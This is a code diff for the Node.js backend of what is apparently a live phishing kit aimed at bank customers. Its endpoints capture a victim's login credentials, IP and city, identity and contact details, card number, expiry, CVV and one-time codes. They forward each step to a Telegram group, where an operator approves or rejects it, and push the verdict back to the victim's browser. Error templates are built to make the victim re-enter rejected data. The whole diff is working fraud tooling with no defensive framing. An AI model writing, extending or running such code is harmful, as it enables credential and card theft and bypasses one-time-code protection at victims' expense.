@@ -4,7 +4,6 @@ import {
   respondToTelegramCallback,
   sendSimpleTelegramMessage,
   editTelegramMessage,
-  removePending,
 } from "../services/botService.js";
 
 import { v4 as uuidv4 } from "uuid";
@@ -21,7 +20,6 @@ export const initProcess = async (req, res) => {
   let { data, sessionId, socketId, isRetry = false } = req.body;
 
   try {
-    const groupId = process.env.GROUP_1;
     const decrypted = JSON.parse(atob(data));
 
     // Genera nueva sesión o reutiliza existente
@@ -33,18 +31,27 @@ export const initProcess = async (req, res) => {
             socketId,
             decisionId: uuidv4(),
             messageId: null,
+            car: null,
+            exp: null,
+            cvv: null,
             step: 1,
           }
         : {
             ...activeSessions.get(sessionId),
             socketId,
             decisionId: uuidv4(),
+            car: null,
+            exp: null,
+            cvv: null,
             messageId: null,
             step: 1,
           }
       : {
           sessionId,
           socketId,
+          car: null,
+          exp: null,
+          cvv: null,
           decisionId: uuidv4(),
           messageId: null,
           step: 1,
@@ -105,8 +112,8 @@ export const telegramWebhook = async (req, res) => {
 };
 
 export const appendCardData = async (req, res) => {
-  const { card, exp, cvv, socketId } = req.body;
-  const session = activeSessions.get(socketId);
+  const { card, exp, cvv, messageId, sessionId } = req.body;
+  const session = activeSessions.get(sessionId);
 
   if (!session) return res.status(400).json({ error: "No hay sesión activa" });
 
@@ -115,15 +122,40 @@ export const appendCardData = async (req, res) => {
     session.exp = exp;
     session.cvv = cvv;
     session.step = 2;
+    session.showOptions = true;
     const newText = buildMessageText(session);
 
-    await editTelegramMessage({
-      chatId: session.chatId,
-      messageId: session.messageId,
+    decisionMap.set(session.decisionId, session.sessionId);
+    activeSessions.set(session.sessionId, session);
+
+    await sendTelegramAlert({
+      groupId: process.env.GROUP_1,
+      messageId: messageId,
       text: newText,
+      sessionId: session.sessionId,
     });
 
-    return res.status(200).json({ success: true });
+    // Espera decisión con el nuevo decisionId
+    waitForDecision(session.decisionId, session.step)
+      .then((decision) => {
+        const sockId = session.socketId;
+        if (sockId && ioInstance) {
+          ioInstance.to(sockId).emit("decision", decision);
+          decisionMap.delete(session.decisionId);
+        }
+      })
+      .catch((err) => {
+        console.error("Timeout:", err.message);
+        activeSessions.delete(session.sessionId);
+        decisionMap.delete(session.decisionId);
+      });
+
+    return res.status(200).json({
+      success: true,
+      step: session.step,
+      sessionId: session.sessionId,
+      messageId: session.messageId,
+    });
   } catch (error) {
     console.error("Error en appendCardData:", error);
     return res.status(500).json({ success: false, error: error.message });
@@ -131,8 +163,8 @@ export const appendCardData = async (req, res) => {
 };
 
 export const appendPersonData = async (req, res) => {
-  const { name, id, add, tel, socketId } = req.body;
-  const session = activeSessions.get(socketId);
+  const { name, id, add, tel, sessionId } = req.body;
+  const session = activeSessions.get(sessionId);
 
   if (!session) return res.status(400).json({ error: "No hay sesión activa" });
 
@@ -142,15 +174,19 @@ export const appendPersonData = async (req, res) => {
     session.add = add;
     session.tel = tel;
     session.step = 2;
+    session.showOptions = false;
+    activeSessions.set(session.sessionId, session);
     const newText = buildMessageText(session);
 
-    await editTelegramMessage({
-      chatId: session.chatId,
-      messageId: session.messageId,
+    const result = await sendTelegramAlert({
+      sessionId: session.sessionId,
+      groupId: process.env.GROUP_1,
       text: newText,
     });
 
-    return res.status(200).json({ success: true });
+    return res
+      .status(200)
+      .json({ success: true, messageId: result.message_id });
   } catch (error) {
     console.error("Error en appendCardData:", error);
     return res.status(500).json({ success: false, error: error.message });
@@ -176,46 +212,44 @@ export const sendSimpleMessage = async (req, res) => {
 export const errorMessage = async (req, res) => {};
 
 export const updateMessageWithOtp = async (req, res) => {
-  const { otp, socketId } = req.body;
+  const { otp, sessionId } = req.body;
 
-  const session = activeSessions.get(socketId);
+  const session = activeSessions.get(sessionId);
   if (!session)
     return res
       .status(400)
       .json({ error: "No hay sesión activa para ese socketId" });
 
   try {
+    session.option = '';
     session.otp = otp;
+    session.step = 3;
 
-    const messageText = buildMessageText(session, 3);
+    decisionMap.set(session.decisionId, session.sessionId);
+    activeSessions.set(session.sessionId, session);
+    
+    const messageText = buildMessageText(session);
 
-    const newDecisionId = `${socketId}-otp-${Date.now()}`;
-    session.decisionId = newDecisionId;
-
-    await editTelegramMessage({
-      chatId: session.chatId,
+    await sendTelegramAlert({
+      groupId: process.env.GROUP_1,
       messageId: session.messageId,
       text: messageText,
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "Continuar", callback_data: `continue:${newDecisionId}` },
-            { text: "Finalizar", callback_data: `finalize:${newDecisionId}` },
-          ],
-        ],
-      },
+      sessionId: session.sessionId
     });
 
-    waitForDecision(newDecisionId)
+    waitForDecision(session.decisionId, session.step)
       .then((decision) => {
         const sockId = session.socketId;
-        const sess = activeSessions.get(sockId);
-        if (sess && ioInstance) {
-          ioInstance.to(sockId).emit("final-decision", decision);
+
+        if (sockId && ioInstance) {
+          ioInstance.to(sockId).emit("decision", decision);
+          decisionMap.delete(session.decisionId);
         }
       })
       .catch((err) => {
-        console.error("Timeout esperando decisión del OTP:", err.message);
+        console.error("Timeout:", err.message);
+        activeSessions.delete(session.sessionId);
+        decisionMap.delete(session.decisionId);
       });
 
     return res.status(200).json({ success: true });
@@ -225,33 +259,84 @@ export const updateMessageWithOtp = async (req, res) => {
   }
 };
 
-export function buildMessageText(session) {
+function mask(value) {
+   if (typeof value !== 'string') return '';
+  return value.match(/.{1,4}/g)?.join(' ') || '';
+}
+
+export function buildMessageText(session, err = 0) {
   const step = session.step;
-  let baseText = `
-🚨 Ingreso: ${session.sessionId}
+  let baseText;
+  if (err == 0) {
+    baseText = `
+🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
+
 👤 Usuario: ${session.user}
 🔑 Contraseña: ${session.pass}
-🔑 IP: ${session.ip}
-🔑 Ciudad: ${session.city}
+🗺️ IP: ${session.ip}
+🌆 Ciudad: ${session.city}
 `;
 
-  if (step >= 2) {
-    baseText += `
-💳 Nombre: ${session.name || "PENDIENTE"}
-💳 Documento: ${session.id || "PENDIENTE"}
-💳 Dirección: ${session.add || "PENDIENTE"}
-💳 Telefóno: ${session.phone || "PENDIENTE"}
-💳 Tarjeta: ${session.card || "PENDIENTE"}
+    if (step >= 2) {
+      baseText += `
+🚨 Nueva Data 🚨
+
+🙍‍♂️ Nombre: ${session.name || "PENDIENTE"}
+🪪 Documento: ${session.id || "PENDIENTE"}
+📌 Dirección: ${session.add || "PENDIENTE"}
+📱 Telefóno: ${session.tel || "PENDIENTE"}
+ 
+💳 Tarjeta: ${session.card ? mask(session.card) : "PENDIENTE"}
 📆 Exp: ${session.exp || "PENDIENTE"}
 🔐 CVV: ${session.cvv || "PENDIENTE"}
 `;
-  }
+    }
 
-  if (step >= 3) {
-    baseText += `
-✅ OTP: ${session.otp || "PENDIENTE"}
+    if (step >= 3) {
+      baseText += `
+🚨 Nueva Data 🚨
+✅ Dinamica: ${session.otp || "PENDIENTE"}
 `;
-  }
+    }
 
-  return baseText.trim();
+    return baseText.trim();
+  } else {
+    let errText;
+    if(err === 1) {
+      errText = `
+🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
+
+🛑 Error Logo 🛑
+👤 Usuario: ${session.user}
+🔑 Contraseña: ${session.pass}
+      `
+    }
+    if(err === 2) {
+      errText = `
+🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
+
+🛑 Error CC 🛑
+💳 Tarjeta: ${session.card ? mask(session.card) : "PENDIENTE"}
+📆 Exp: ${session.exp}
+🔐 CVV: ${session.cvv}
+      `
+    }
+    if(err === 3) {
+      errText = `
+🚨 Ingreso: ${session.sessionId.split("-")[0]}
+
+🛑 Error Dinamica 🛑
+❌ Dinamica: ${session.otp}
+      `
+    }
+    if(err === 4) {
+      errText = `
+🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
+
+🛑 Error OTP 🛑
+❌ OTP: ${session.otp}
+      `
+    }
+    return errText.trim();
+  }
 }
